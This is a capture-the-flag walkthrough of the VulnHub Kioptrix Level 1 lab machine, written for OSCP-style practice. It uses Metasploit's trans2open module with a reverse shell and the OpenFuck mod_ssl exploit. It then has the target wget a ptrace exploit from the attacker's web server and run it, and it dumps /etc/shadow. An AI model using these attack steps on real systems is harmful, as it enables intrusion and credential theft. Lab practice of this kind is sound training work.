# Kioptrix Level 1

> **Details reconstructed from memory of my own completed walkthrough — exact commands/outputs may be paraphrased.**

**Platform:** VulnHub  
**Difficulty:** Easy (OSCP-style classic)  
**Category:** Linux, Samba, Apache/OpenSSL, remote buffer overflow

![OS](https://img.shields.io/badge/OS-Linux-yellow?style=flat-square&logo=linux)

![CVE](https://img.shields.io/badge/CVE-2002--0082-critical?style=flat-square)

![Status](https://img.shields.io/badge/Status-Educational-blue?style=flat-square)

---

## Overview

Kioptrix Level 1 is the first box in the legendary Kioptrix series and a staple of OSCP-style preparation. It models an **early-2000s Red Hat Linux** host running wildly outdated services, and it is deliberately solvable **two independent ways**:

- **Path A — Samba `trans2open`:** an old Samba **2.2.1a** daemon vulnerable to a remote buffer overflow that lands a **root** shell directly.
- **Path B — Apache mod_ssl / OpenSSL (`OpenFuck`):** Apache **1.3.20 + mod_ssl 2.8.4 / OpenSSL 0.9.6b** vulnerable to **CVE-2002-0082**, giving an `apache` shell that is then escalated to root with a kernel `ptrace` exploit.

I completed both to compare a one-shot Metasploit kill with a compile-your-own public exploit — exactly the muscle memory OSCP rewards.

---

## Reconnaissance

```bash
nmap -sC -sV -p- -oN kioptrix-full.txt <target-ip>
```

The classic Kioptrix service spread:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 2.9p2 (protocol 1.99) |
| 80/tcp | HTTP | Apache 1.3.20 (Red-Hat) · mod_ssl 2.8.4 · OpenSSL 0.9.6b |
| 111/tcp | rpcbind | RPC |
| 139/tcp | netbios-ssn | Samba (workgroup MYGROUP) |
| 443/tcp | ssl/https | same Apache/mod_ssl stack |

Two obvious, ancient attack surfaces stood out: **Samba** (139) and **Apache/mod_ssl** (80/443).

### Fingerprint Samba

nmap did not print the exact Samba version, so I pinned it:

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_version
set RHOSTS <target-ip>
run
# → Unix (Samba 2.2.1a)
```

`smbclient -L //<target-ip>/` confirmed the NetBIOS name **KIOPTRIX** and the 2.2.x branch. Samba 2.2.0–2.2.8 is vulnerable to **trans2open**.

### Fingerprint Apache

The `mod_ssl/2.8.4` banner immediately flagged **CVE-2002-0082** (the "OpenFuck" / "OpenLuck" remote overflow). `searchsploit mod_ssl 2.8.4` returned the `OpenFuckV2.c` exploit.

---

## Path A — Samba `trans2open` (direct root)

The reliable one-shot is the Metasploit module:

```bash
use exploit/linux/samba/trans2open
set RHOSTS <target-ip>
set LHOST <your-ip>
```

**Key gotcha:** the default **staged** payload (`linux/x86/meterpreter/reverse_tcp`) dies on this old target. Switch to a **non-staged** payload:

```bash
set payload linux/x86/shell_reverse_tcp
run
```

The module brute-forces return addresses, the overflow fires, and because `smbd` runs as root, the shell is **root** immediately:

```bash
id
# uid=0(root) gid=0(root) groups=99(nobody)
```

No separate privesc stage — Samba ran privileged.

---

## Path B — Apache mod_ssl / OpenSSL (CVE-2002-0082)

### 1. Get the exploit and fix it to compile

`OpenFuckV2.c` is ~20 years old and won't build on a modern Kali without tweaks. Grab a maintained copy (e.g. `heltonWernik/OpenLuck`) or patch the original:

- add `#include <openssl/rc4.h>` and `#include <openssl/md5.h>`
- install headers: `sudo apt install libssl-dev`

```bash
gcc -o OpenFuck OpenFuckV2.c -lcrypto
```

### 2. Pick the right target offset

```bash
./OpenFuck | grep 1.3.20
# 0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
# 0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
```

The box matches Red Hat 7.2 apache-1.3.20. `0x6b` is the working offset (`0x6a` often fails).

### 3. Run it

```bash
./OpenFuck 0x6b <target-ip> 443 -c 50
# ...
whoami
# apache
```

The exploit downloads + compiles its connect-back on the target and drops an **`apache`** user shell.

### 4. Privilege escalation — ptrace kmod

The kernel is old enough for the `ptrace`/`kmod` local root (`ptrace-kmod.c`). From the apache shell, pull and build it:

```bash
# on attacker
python3 -m http.server 80
# on target (apache shell)
wget http://<your-ip>/ptrace-kmod.c -O /tmp/p.c
gcc -o /tmp/p /tmp/p.c
chmod +x /tmp/p
/tmp/p
id
# uid=0(root) gid=0(root)
```

That completes the chain: web/SSL overflow → `apache` → kernel exploit → **root**.

---

## Proof & Loot

```bash
id
whoami
cat /etc/shadow        # dump hashes for cracking practice
hostname               # KIOPTRIX
```

---

## Lessons Learned

Kioptrix 1 is the box that teaches **banner-driven exploitation**: nearly every finding comes straight from a version string, and the work is confirming the version, choosing the matching public exploit, and getting a 20-year-old C file to compile.

Key takeaways:

- **Fingerprint before firing.** `smb_version` nailed Samba 2.2.1a where nmap wouldn't; the Apache banner handed over CVE-2002-0082.
- **Staged vs non-staged payloads matter** on ancient targets — `trans2open` only stabilized with `shell_reverse_tcp`.
- **Old public exploits need porting** — missing includes, deprecated libs, wrong offsets. Reading and fixing the source is the actual OSCP skill, not running a module.
- **Two paths, same box.** Samba gives instant root; the Apache path forces a real foothold-then-privesc chain. Doing both builds range.

This pairs with my other VulnHub writeups ([Basic Pentesting 1](basic-pentesting-1.md) / [2](basic-pentesting-2.md), [Mr. Robot](mr-robot.md)) — same methodology, but Kioptrix is pure "legacy service → known CVE" muscle memory.
